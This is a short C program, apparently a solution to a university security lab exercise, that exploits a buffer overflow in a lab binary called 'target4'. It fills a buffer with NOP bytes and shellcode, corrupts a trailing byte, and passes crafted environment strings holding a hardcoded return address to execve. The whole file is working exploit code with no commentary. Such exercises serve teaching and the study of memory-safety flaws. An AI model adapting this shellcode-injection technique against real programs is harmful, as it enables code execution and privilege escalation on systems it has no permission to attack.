#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define DEFAULT_BUFFER_SIZE  201
#define NOP 0x90
#define ZERO 0x00

int main(void)
{
	char *	args[3];
	char *	env[8];
	int bsize = DEFAULT_BUFFER_SIZE;
	char* buff, *ptr;	

	if(!(buff = (char*)malloc(bsize * sizeof(char)))){
		printf("can't allocate memory\n");
		exit(0);	
	}

	unsigned long *add_ptr;
	int i;
	for (i = 0; i < bsize; i++){
		buff[i] = NOP;
	}

	ptr = buff + bsize - strlen(shellcode)  - 1 ;
	for (i=0; i<strlen(shellcode); i++){
		*(ptr++) = shellcode[i];
	}
	*(ptr) = 0xdc;


	  args[0] = TARGET; 
	  args[1] = buff; 
	  args[2] = NULL;
	  
	env[0] = "\x00";
	env[1] = "\x00";
	env[2] = "\xCC";
	env[3] = "\x00";
	env[4] = "\x00";
	env[5] = "\x00";
	env[6] = "\x90\x90\x90\x90\x90\x90";
	env[7] = "\x90\xfd\xa4\x40";

	  if (0 > execve(TARGET, args, env))
	    fprintf(stderr, "execve failed.\n");

  return 0;
}
